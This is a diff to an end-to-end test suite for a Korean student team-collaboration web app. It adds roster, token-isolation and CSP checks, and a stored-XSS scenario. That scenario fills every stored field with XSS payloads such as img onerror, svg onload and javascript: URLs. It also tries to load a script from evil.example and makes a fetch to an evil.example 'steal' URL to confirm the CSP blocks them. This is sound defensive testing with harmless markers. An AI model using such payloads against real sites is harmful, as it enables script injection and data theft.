@@ -133,6 +133,7 @@ async function scenarioRoom() {
   ok((await getDoc(`teams/${T}/claims/${mB}`))?.uid === 'uB', '초대 링크로 참여 → 빈자리 선점');
   await until(() => A.eval(`state.members.some(m => m.uid === 'uB')`));
   ok(A.eval(`state.members.find(m => m.uid === 'uB')?.name`) === '김단유', '다른 팀원 화면에 실시간 반영');
+  ok((await getDoc(`teams/${T}/roster/${mB}`))?.uid === 'uB' && !(await getDoc(`teams/${T}`)).members?.length, '명단은 팀원별 문서에 저장');
 
   // C는 이미 B가 쓰는 칸을 가로챌 수 없다
   await C.eval(`joinFromInput(${JSON.stringify(link)})`);
@@ -247,6 +248,11 @@ async function scenarioRoom() {
   await until(() => A.eval(`state.online && state.online.has(state.meId) && state.online.has('${mB}') && state.online.has('${mC}')`));
   ok(A.eval(`state.online.has('${mB}') && state.online.has('${mC}')`), '접속 중 표시: 방금 참여한 팀원도 2분을 기다리지 않음 (RQ-8)');
   noDenied(A, 'A'); noDenied(B, 'B'); noDenied(C, 'C'); noDenied(P, '교수자');
+  // 실제 CSP 아래에서 정상 기능이 막히지 않았는지
+  for (const [w, who] of [[A, 'A'], [B, 'B'], [P, '교수자']]) {
+    const v = w.__csp.filter(x => !x.includes('evil.example'));
+    ok(!v.length, `${who}: CSP에 걸린 정상 요청 없음${v.length ? ` → ${v.slice(0, 3).join(' | ')}` : ''}`);
+  }
   return { A, B, C, P, X, T, mA, mB, mC };
 }
 
@@ -482,6 +488,14 @@ async function scenarioLegacy() {
   A.eval(`addItem({ memberId: state.meId, type: 'memo', title: '옛 방에서도 저장', content: '내용', visibility: 'team' })`);
   await until(async () => (await list(`teams/${T}/items`)).length === 1);
   ok(true, '예전 방: 기록 저장 그대로');
+  await until(async () => (await list(`teams/${T}/roster`)).length === 3, 8000);
+  const moved = await list(`teams/${T}/roster`);
+  ok(moved.length === 3 && moved.find(m => m.id === 'mFree')?.name === '빈자리', '예전 방: 명단이 roster 문서로 옮겨짐');
+  ok(A.eval(`state.members.map(m => m.name).join()`) === '안치성,김단유,빈자리', '예전 방: 명단 순서 유지');
+  // B(팀원)가 자기 칸을 고치면 roster로 저장되고 A에게 보인다
+  B.eval(`member(state.meId).connections = { github: 'ok' }; saveState()`);
+  await until(() => A.eval(`member('mB').connections?.github === 'ok'`));
+  ok(A.eval(`member('mB').connections?.github === 'ok'`), '내 칸 수정이 다른 팀원에게 반영');
   // 끊긴 삭제: deleting 표시만 된 상태에서 팀원은 들어올 수 없고 팀장은 이어서 지운다
   await A.eval(`teamRef().update({ deleting: true })`);
   await until(() => B.eval('cloud.teamId === null'));
@@ -548,16 +562,18 @@ window.scenarioAi = async () => {
   ok(off.summaryBy === 'rule' && off.decisions.length === 1, 'AI 끄면 규칙 기반 (결정 후보는 그대로)');
   A.eval('setAiSwitch(true)');
 
-  // OAuth 왕복
+  // OAuth 왕복 (같은 탭의 iframe은 세션을 공유하므로 B를 닫는다. 실제로는 사람마다 브라우저가 다르다)
+  noDenied(B, 'B');
+  closeFrame('uB');
   A.eval(`sessionStorage.setItem('brainroom:oauth-pending', JSON.stringify({ provider: 'notion', state: 's1', at: Date.now() }))`);
   frames.uA.src = `/app.html?u=uA&proxy=${encodeURIComponent(PROXY)}&code=c1&state=s1`;
   await until(() => { const w = frames.uA.contentWindow; return w.location.search.indexOf('u=') < 0 && w.eval('typeof loadInteg === "function"'); });
   const W = frames.uA.contentWindow;
   ok(!W.location.search.includes('code='), 'OAuth 코드가 주소창에서 바로 사라짐');
   await until(() => W.eval(`loadInteg().notion?.oauth === true`), 15000);
-  const integ = JSON.parse(W.localStorage.getItem('brainroom:integrations') || '{}');
+  const integ = JSON.parse(W.localStorage.getItem('brainroom:integrations:uA') || '{}');
   ok(integ.notion?.userId === 'notion-user-1', 'Notion OAuth 연결 + 내 Notion 계정 자동 인식');
-  const raw = W.localStorage.getItem('brainroom:integrations');
+  const raw = W.localStorage.getItem('brainroom:integrations:uA');
   ok(!raw.includes('ntn_oauth_secret') && !raw.includes('nr_1') && integ.notion.expiresAt > Date.now(), '토큰과 갱신 토큰 모두 암호화 저장, 만료 시각 기록');
 
   // 만료 임박 → 갱신
@@ -584,7 +600,14 @@ window.scenarioAi = async () => {
   ok(/오늘 \d+\/\d+회/.test(W2.document.getElementById('aiUsage')?.textContent || ''), `연동 화면에 AI 사용량 (${W2.document.getElementById('aiUsage')?.textContent})`);
   const plog = await (await fetch(`${PROXY}/test-log`)).json();
   ok(plog.filter(u => u === '/v1/messages').length >= 3, `프록시가 Claude를 ${plog.filter(u => u === '/v1/messages').length}번 호출`);
-  noDenied(W2, 'A'); noDenied(B, 'B');
+  noDenied(W2, 'A');
+  // 다른 계정의 연동 토큰은 쓸 수 없다
+  W2.localStorage.setItem('brainroom:integrations:uOther', JSON.stringify({ github: { token: 'other-token', login: 'other' } }));
+  ok(!W2.eval('JSON.stringify(loadInteg())').includes('other-token'), '다른 계정의 연동 토큰이 보이지 않음');
+  W2.confirm = () => true;
+  W2.eval('forgetIntegOnLogout()');
+  ok(!W2.localStorage.getItem('brainroom:integrations:uA'), '로그아웃할 때 내 토큰을 지울 수 있음');
+  W2.localStorage.removeItem('brainroom:integrations:uOther');
 };
 
 // 간헐 오류 재현용: 접근 기록 + 방 삭제를 반복한다 (npm run e2e -- stress 처럼 따로 돌린다)
@@ -610,13 +633,148 @@ async function scenarioStress(rounds = 12) {
   }
 }
 
+// ---------- 악의적인 팀원: DB의 모든 칸에 공격 문자열 (규칙을 우회해 넣는다 = 옛 데이터나 규칙 구멍을 가정) ----------
+const XSS = `"><img src=x onerror="window.__xss=(window.__xss||0)+1"><svg onload="window.__xss=(window.__xss||0)+1"></svg>'`;
+const XSS_ID = XSS.replace(/\//g, '');
+const XSS_NODES = 'img[src="x"], svg[onload], [onerror], [onload]';
+async function seedHostile(T) {
+  const now = Date.now();
+  const bad = XSS;
+  await setDoc(`teams/${T}`, { teamName: bad, course: bad, ownerUid: 'uA', decisionDismissed: [bad], links: { github: bad, figma: [bad], notion: [bad] }, members: [
+    { id: 'mA', name: '안치성', color: '#6366f1', uid: 'uA', email: 'a@x.com' },
+    { id: 'mBad', name: bad, color: `red;"><img src=x onerror="window.__xss=1">`, uid: 'uBad', email: bad, photo: bad, connections: { github: bad, [XSS_ID]: bad }, pinnedIdeaId: bad },
+    { id: XSS_ID, name: 'id공격', color: '#000000' },
+  ] });
+  await setDoc(`teams/${T}/roster/mBad`, { id: 'mBad', name: bad, color: bad, photo: bad, email: bad, connections: { notion: bad } });
+  await setDoc(`teams/${T}/roster/mBad2`, { id: bad, name: bad, color: bad, at: bad });
+  await setDoc(`teams/${T}/members/uA`, { uid: 'uA', role: 'student', memberId: 'mA', code: '', joinedAt: 1 });
+  await setDoc(`teams/${T}/members/uP`, { uid: 'uP', role: 'prof', memberId: null, code: '', joinedAt: 1 });
+  await setDoc(`teams/${T}/claims/mA`, { uid: 'uA', at: 1 });
+  await setDoc(`teams/${T}/secrets/student`, { code: 'student-code-123456', expiresAt: bad });
+  await setDoc('users/uA', { teams: { [T]: { name: bad, role: 'student' } } });
+  await setDoc('users/uP', { teams: { [T]: { name: bad, role: 'prof' } } });
+  const base = { memberId: 'mBad', ownerUid: 'uBad', title: bad, content: bad, url: `javascript:window.__xss=1//${bad}`, createdAt: now - 1000, visibility: 'prof', keywords: [bad, '다회용기'], themes: [bad, 'eco'], votes: [bad], table: null };
+  const items = {
+    i1: { ...base, id: 'i1', type: 'memo' },
+    i2: { ...base, id: 'i2', type: 'idea', table: { x: bad, y: bad } },
+    i3: { ...base, id: 'i3', type: 'link', url: bad },
+    i4: { ...base, id: 'i4', type: 'ai', ai: { tool: bad, purpose: bad, transcript: bad, sourceId: bad, decisions: [bad], summaryBy: bad } },
+    i5: { ...base, id: 'i5', type: 'talk', talk: { callId: 'c1', lineCount: bad, keywords: [bad], transcript: bad, decisions: [bad] } },
+    i6: { ...base, id: 'i6', type: 'work', work: { source: 'github', kind: bad, keywords: [bad], repo: bad, count: bad, ai: bad } },
+    i7: { ...base, id: 'i7', type: bad },
+    i8: { ...base, id: 'i8', type: 'search', visibility: bad, memberId: bad },
+    i9: { ...base, id: 'i9', type: 'memo', createdAt: bad },
+    i10: { ...base, id: XSS_ID, type: 'memo' },
+  };
+  for (const [k, it] of Object.entries(items)) {
+    await setDoc(`teams/${T}/items/${k}`, it);
+    await setDoc(`teams/${T}/itemMeta/${k}`, { memberId: it.memberId, ownerUid: it.ownerUid, type: it.type, createdAt: it.createdAt, visibility: it.visibility, purpose: bad, correctionId: null, imported: null });
+  }
+  await setDoc(`teams/${T}/decisions/d1`, { id: XSS_ID, text: bad, sourceIds: ['i1', bad], origin: bad, candidateKey: bad, createdAt: now, createdBy: bad });
+  await setDoc(`teams/${T}/quests/q1`, { id: XSS_ID, week: Date.now(), title: bad, target: bad, count: bad, done: false });
+  await setDoc(`teams/${T}/corrections/k1`, { id: XSS_ID, memberId: 'mBad', requesterUid: 'uBad', kind: bad, note: bad, status: 'pending', createdAt: now, title: bad, type: bad, url: bad, itemId: 'i1' });
+  await setDoc(`teams/${T}/logs/l1`, { id: 'l1', at: bad, text: bad });
+  await setDoc(`teams/${T}/accessLogs/a1`, { uid: bad, email: bad, what: bad, at: now });
+  await setDoc(`teams/${T}/presence/uBad`, { uid: 'uBad', memberId: bad, at: now });
+  const call = { title: bad, status: 'ended', startedBy: 'uBad', startedByName: bad, startedAt: now - 5000, endedAt: now, summary: bad, summaryBy: bad, attendees: [bad], lineCount: bad, decisions: [bad], shareProf: true, source: bad };
+  await setDoc(`teams/${T}/calls/c1`, { ...call, id: 'c1' });
+  await setDoc(`teams/${T}/calls/c2`, { ...call, id: XSS_ID });
+  await setDoc(`teams/${T}/calls/live1`, { ...call, id: XSS_ID, status: 'live', endedAt: null });
+  await setDoc(`teams/${T}/calls/c1/lines/l1`, { uid: 'uBad', memberId: 'mBad', name: bad, text: bad, at: bad });
+}
+
+async function scenarioXss() {
+  say('\n=== 악의적인 팀원: 저장형 XSS');
+  closeAll();
+  await wipe();
+  const T = 'xssroom';
+  await seedHostile(T);
+  const A = await open('uA'), P = await open('uP');
+  const check = (w, where) => {
+    const nodes = [...w.document.querySelectorAll(XSS_NODES)];
+    const ran = w.__xss || 0;
+    const errs = w.__errors.filter(e => /exception|rejection/.test(e));
+    w.__errors.length = 0;
+    const safe = !nodes.length && !ran && !errs.length;
+    ok(safe, `${where}${safe ? '' : ` → 주입된 요소 ${nodes.length}개, 실행 ${ran}회, 앱 오류 ${errs.length}건 ${errs[0] ? errs[0].slice(0, 120) : ''} ${nodes[0] ? nodes[0].outerHTML.slice(0, 80) : ''}`}`);
+  };
+  const step = async (where, fn) => {
+    try { await fn(); } catch (e) { (where.startsWith('교수자') || where === '파일' ? P : A).__errors.push(`exception: ${e.message}`); }
+  };
+  await A.eval(`loadMyTeams().then(() => cloudOpenTeam('${T}'))`);
+  await until(() => A.eval('cloud.loaded'), 8000);
+  await sleep(1500);
+  check(A, '방 열기');
+  for (const v of ['meeting', 'room', 'office', 'timeline', 'decisions', 'report', 'calls', 'integrations']) {
+    await step(v, () => A.eval(`go('${v}')`));
+    await sleep(250);
+    check(A, `화면: ${v}`);
+  }
+  await step('방', () => A.eval(`go('room', 'mBad')`)); await sleep(250); check(A, '공격자의 방');
+  for (const z of ['shelf', 'board', 'whiteboard', 'monitor', 'talk', 'decor:recycle']) {
+    await step(z, () => A.eval(`openPanel('mBad', '${z}')`)); await sleep(120); check(A, `방 패널: ${z}`);
+  }
+  await step('패널 닫기', () => A.eval('closePanel()'));
+  await step('메뉴', () => A.eval('openMenu()')); await sleep(200); check(A, '설정 메뉴'); await step('닫기', () => A.eval('closeModal()'));
+  await step('초대', () => A.eval('openInviteModal()')); await sleep(300); check(A, '초대 창'); await step('닫기', () => A.eval('closeModal()'));
+  await step('관리', () => A.eval('openManageModal()')); await sleep(400); check(A, '방 관리'); await step('닫기', () => A.eval('closeModal()'));
+  await step('회의', () => A.eval(`go('calls')`)); await sleep(200);
+  A.document.querySelector('[data-lines="c1"]')?.setAttribute('open', '');
+  await sleep(400); check(A, '녹취록 펼치기');
+  await step('내보내기', () => A.eval('openExportModal()')); await sleep(200); check(A, '내보내기 창'); await step('닫기', () => A.eval('closeModal()'));
+  await step('주간', () => A.eval(`weeklyFrom = weekStart(); go('report')`)); await sleep(200); check(A, '주간 요약');
+  // 교수자 화면 (학생 → 교수자 공격)
+  await step('교수자 열기', () => P.eval(`loadMyTeams().then(() => cloudOpenProf())`));
+  await until(() => P.eval('state && state.cloudProf && cloud.profTeams'), 8000);
+  await step('교수자 주간', () => P.eval(`weeklyFrom = weekStart(); render()`));
+  await sleep(600);
+  check(P, '교수자 보기');
+  // 파일로 받은 워크스페이스도 같은 공격 경로다
+  const file = { version: 1, teamName: XSS, members: [{ id: 'mX', name: XSS, color: XSS }], items: [{ id: XSS_ID, memberId: 'mX', type: XSS, title: XSS, content: XSS, url: XSS, createdAt: XSS, visibility: 'prof', keywords: [XSS], themes: [XSS], votes: [XSS], table: { x: XSS, y: XSS } }], decisions: [], quests: [], corrections: [], changeLog: [] };
+  P.localStorage.setItem('brainroom:prof-teams', JSON.stringify([file]));
+  await step('파일', () => P.eval('render()'));
+  await sleep(400);
+  check(P, '교수자: 팀 제출 파일');
+  P.localStorage.removeItem('brainroom:prof-teams');
+
+  // 두 번째 겹: 화면 코드에 구멍이 남아도 CSP가 스크립트 실행을 막는다
+  A.__csp.length = 0;
+  A.__xss = 0;
+  const holder = A.document.createElement('div');
+  holder.innerHTML = '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onerror="window.__xss=1" onload="window.__xss=1"><a id="jsLink" href="javascript:window.__xss=1">x</a>';
+  A.document.body.appendChild(holder);
+  await sleep(300);
+  A.document.getElementById('jsLink').click();
+  const inlineScript = A.document.createElement('script');
+  inlineScript.textContent = 'window.__xss = 1';
+  A.document.body.appendChild(inlineScript);
+  const externalScript = A.document.createElement('script');
+  externalScript.src = 'https://evil.example/x.js';
+  A.document.body.appendChild(externalScript);
+  await sleep(500);
+  holder.remove();
+  ok(!A.__xss, `CSP: 인라인 스크립트·이벤트·javascript: 링크가 실행되지 않음 (막은 시도 ${A.__csp.length}건)`);
+  ok(A.__csp.some(v => v.includes('evil.example')), 'CSP: 외부 스크립트 차단');
+  let sent = true;
+  try { await A.fetch('https://evil.example/steal?x=1', { mode: 'no-cors' }); } catch (e) { sent = false; }
+  ok(!sent, 'CSP: 데이터를 낯선 서버로 보내지 못함');
+  const frameTest = A.document.createElement('iframe');
+  frameTest.src = 'https://evil.example/';
+  A.document.body.appendChild(frameTest);
+  await sleep(300);
+  ok(A.__csp.some(v => v.startsWith('frame-src')), 'CSP: 낯선 iframe 차단');
+  frameTest.remove();
+}
+
 async function run() {
+  if (ONLY === 'xss') { await scenarioXss(); closeAll(); return; }
   if (ONLY === 'stress') { await scenarioStress(); closeAll(); return; }
   if (!ONLY || ONLY === 'room') {
     const ctx = await scenarioRoom();
     await scenarioCalls(ctx);
     await scenarioManage(ctx);
     await scenarioLegacy();
+    await scenarioXss();
   }
   if (!ONLY || ONLY === 'ai') await window.scenarioAi?.();
   closeAll();
